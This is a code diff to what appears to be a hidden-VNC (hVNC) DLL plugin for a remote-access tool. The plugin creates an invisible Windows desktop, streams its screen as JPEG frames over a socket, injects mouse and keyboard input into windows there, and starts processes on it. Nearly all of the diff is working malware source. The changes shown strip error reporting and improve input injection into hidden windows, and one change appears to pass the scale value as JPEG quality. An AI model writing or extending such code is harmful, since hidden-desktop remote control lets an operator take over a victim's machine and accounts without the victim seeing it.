@@ -205,9 +205,6 @@ static void ensure_desktop() {
     if (!g_hHiddenDesktop) {
         g_hHiddenDesktop = CreateDesktopW(g_desktopName.c_str(), NULL, NULL, 0, GENERIC_ALL, NULL);
     }
-    if (!g_hHiddenDesktop) {
-        send_error("Failed to create/open hidden desktop");
-    }
 }
 
 // Window compositing helper
@@ -234,7 +231,6 @@ static void capture_loop() {
     }
 
     if (!SetThreadDesktop(g_hHiddenDesktop)) {
-        send_error("Failed to attach capture thread to hidden desktop");
         g_captureRunning = false;
         return;
     }
@@ -301,7 +297,7 @@ static void capture_loop() {
         StretchBlt(hdcFinal, 0, 0, dw, dh, hdcMem, 0, 0, sw, sh, SRCCOPY);
 
         vector<unsigned char> jpeg;
-        if (bitmap_to_jpeg(hbmpFinal, 50, jpeg)) {
+        if (bitmap_to_jpeg(hbmpFinal, (ULONG)scale, jpeg)) {
             safe_send_hvnc_frame(s, scale, fps, dw, dh, jpeg);
         }
 
@@ -337,45 +333,77 @@ static void input_loop() {
         int sw = GetSystemMetrics(SM_CXSCREEN);
         int sh = GetSystemMetrics(SM_CYSCREEN);
 
-        // Normalized (0-65535) to Screen Absolute
         int x = (task.cmd.value("x", 0) * sw) / 65535;
         int y = (task.cmd.value("y", 0) * sh) / 65535;
-
         POINT pt = {x, y};
-        HWND targetHwnd = WindowFromPoint(pt);
-        if (!targetHwnd) continue;
 
-        POINT clientPt = pt;
-        ScreenToClient(targetHwnd, &clientPt);
-        LPARAM mouseLParam = MAKELPARAM(clientPt.x, clientPt.y);
+        HWND hwnd = WindowFromPoint(pt);
+        if (!hwnd) continue;
 
-        if (task.action == "hvnc_mousemove") {
-            PostMessageW(targetHwnd, WM_MOUSEMOVE, 0, mouseLParam);
-            SetCursorPos(x, y);
-        } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
-            int btn = task.cmd.value("button", 0);
-            UINT msg = 0;
-            WPARAM wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+        if (task.action.find("hvnc_mouse") != string::npos) {
+            LRESULT hitTest = SendMessageW(hwnd, WM_NCHITTEST, 0, MAKELPARAM(x, y));
 
-            if (task.action == "hvnc_mousedown") {
-                msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
-                SetFocus(targetHwnd);
-                SetForegroundWindow(targetHwnd);
-            } else {
-                msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
+            if (task.action == "hvnc_mousemove") {
+                PostMessageW(hwnd, WM_MOUSEMOVE, 0, MAKELPARAM(x, y));
+                PostMessageW(hwnd, WM_SETCURSOR, (WPARAM)hwnd, MAKELPARAM(hitTest, WM_MOUSEMOVE));
+            } else if (task.action == "hvnc_mousedown" || task.action == "hvnc_mouseup") {
+                int btn = task.cmd.value("button", 0);
+                UINT msg = 0;
+                WPARAM wParam = 0;
+
+                if (task.action == "hvnc_mousedown") {
+                    SetForegroundWindow(hwnd);
+                    SetFocus(hwnd);
+
+                    if (hitTest != HTCLIENT) {
+                        msg = (btn == 0) ? WM_NCLBUTTONDOWN : (btn == 1 ? WM_NCRBUTTONDOWN : WM_NCMBUTTONDOWN);
+                        wParam = hitTest;
+                    } else {
+                        HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
+                        if (hChild && hChild != hwnd) {
+                            hwnd = hChild;
+                            POINT clientPt = pt;
+                            ScreenToClient(hwnd, &clientPt);
+                            msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
+                            wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+                            PostMessageW(hwnd, msg, wParam, MAKELPARAM(clientPt.x, clientPt.y));
+                            continue;
+                        }
+                        msg = (btn == 0) ? WM_LBUTTONDOWN : (btn == 1 ? WM_RBUTTONDOWN : WM_MBUTTONDOWN);
+                        wParam = (btn == 0) ? MK_LBUTTON : (btn == 1 ? MK_RBUTTON : MK_MBUTTON);
+                    }
+                } else {
+                    if (hitTest != HTCLIENT) {
+                        msg = (btn == 0) ? WM_NCLBUTTONUP : (btn == 1 ? WM_NCRBUTTONUP : WM_NCMBUTTONUP);
+                        wParam = hitTest;
+                    } else {
+                        HWND hChild = ChildWindowFromPointEx(hwnd, pt, CWP_SKIPINVISIBLE);
+                        if (hChild && hChild != hwnd) {
+                            hwnd = hChild;
+                            POINT clientPt = pt;
+                            ScreenToClient(hwnd, &clientPt);
+                            msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
+                            PostMessageW(hwnd, msg, 0, MAKELPARAM(clientPt.x, clientPt.y));
+                            continue;
+                        }
+                        msg = (btn == 0) ? WM_LBUTTONUP : (btn == 1 ? WM_RBUTTONUP : WM_MBUTTONUP);
+                    }
+                }
+                PostMessageW(hwnd, msg, wParam, MAKELPARAM(x, y));
             }
-            PostMessageW(targetHwnd, msg, wParam, mouseLParam);
-        } else if (task.action == "hvnc_keydown" || task.action == "hvnc_keyup") {
+        } else if (task.action.find("hvnc_key") != string::npos) {
             int vk = task.cmd.value("keycode", 0);
-            HWND focusHwnd = GetFocus();
-            if (!focusHwnd) focusHwnd = GetForegroundWindow();
-            if (!focusHwnd) focusHwnd = targetHwnd;
+            HWND hFocus = GetFocus();
+            if (!hFocus) hFocus = GetForegroundWindow();
+            if (!hFocus) hFocus = hwnd;
 
             if (task.action == "hvnc_keydown") {
-                PostMessageW(focusHwnd, WM_KEYDOWN, vk, 0);
-                PostMessageW(focusHwnd, WM_CHAR, vk, 0);
+                SendMessageW(hFocus, WM_KEYDOWN, vk, 0);
+                if ((vk >= 0x30 && vk <= 0x39) || (vk >= 0x41 && vk <= 0x5A) || vk == VK_SPACE || vk == VK_RETURN || vk == VK_BACK) {
+                    SendMessageW(hFocus, WM_CHAR, vk, 0);
+                }
             } else {
-                PostMessageW(focusHwnd, WM_KEYUP, vk, 0);
+                SendMessageW(hFocus, WM_KEYUP, vk, 0);
             }
         }
     }
@@ -435,7 +463,7 @@ extern "C" __declspec(dllexport) void HandleCommand(SOCKET sock, const char* cmd
             si.wShowWindow = SW_SHOW;
 
             PROCESS_INFORMATION pi = { 0 };
-            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi)) {
+            if (CreateProcessW(NULL, cmdLine.data(), NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
                 CloseHandle(pi.hProcess);
                 CloseHandle(pi.hThread);
                 send_status("Process started on hidden desktop");
